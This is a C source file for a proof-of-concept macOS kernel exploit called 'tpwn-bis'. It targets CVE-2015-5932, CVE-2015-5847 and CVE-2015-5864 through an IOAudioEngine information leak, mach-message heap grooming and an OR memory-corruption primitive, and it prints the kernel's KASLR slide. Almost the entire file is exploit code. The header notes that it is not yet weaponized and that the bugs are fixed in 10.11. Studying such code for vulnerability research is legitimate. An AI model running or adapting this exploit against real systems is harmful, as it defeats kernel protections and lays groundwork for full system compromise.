/*
  tpwn-bis -- exploitation of cve-2015-5932 / cve-2015-5847 / cve-2015-5864
  thanks to @qwertyoruiop for original code (tpwn) and additional help.
  these vulns are RIP in 10.11

  * this poc is not weaponized yet, only leaks KASLR slide! *
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>

#import <Foundation/Foundation.h>

#include "helper.h"
#include "pwn.h"

int main(void)
{
  macho_map_t *kernel_map = hp_macho_map(K_PATH);
  macho_map_t *audio_map = hp_macho_map(A_PATH);

  pwn_init();

  char* vz = calloc(1500,1);

  kern_obj_t kernel_objects[2];
  io_connect_t connections[16];
  mach_port_t ports[256];

  int active=0;

  while(1) {
    for (uint32_t k = 0; k != 10; k++) {
      if (connections[k]) {
        IOServiceClose(connections[k]);
        connections[k]=0;
      }
    }

    if (((kernel_objects[0].kptr = io_audio_engine_infoleak(&(kernel_objects[0].kconn))) & 0xfff) != 0xc00) {
      while ((kernel_objects[1].kptr = io_audio_engine_infoleak(&(kernel_objects[1].kconn)))) {
        if (kernel_objects[1].kptr == kernel_objects[0].kptr+1024) {
          goto done;
        }

        if (active==10) {
          break;
        }

        connections[active]=kernel_objects[1].kconn;
        kernel_objects[1].kconn=0;
        active++;

      }
    }

  }

  done:;
  //printf("done! 0: %#llx -- 1: %#llx\n", kernel_objects[0].kptr, kernel_objects[1].kptr);

  IOServiceClose(kernel_objects[0].kconn);

  for (uint32_t i = 0; i < 256; i++) {
    hp_msg_send_kernel(vz, 1024-88, &ports[i]);
  }

  or_primitive(kernel_objects[0].kptr + 16);

  for (uint32_t i = 0; i < 256; i++) {
    char *kek = (char*)hp_msg_recv_kernel(ports[i]);
    uint64_t slid=*(uint64_t*)(kek+(1024-88));
    if (slid) {
      uint64_t unslid=hp_find_kext_base("com.apple.iokit.IOAudioFamily") + hp_find_symbol(audio_map, "__ZTV23IOAudioEngineUserClient") + 0x10;
      printf("KASLR slide is: %#llx\n", slid-unslid);
      break;
    }
  }

  return 0;
}
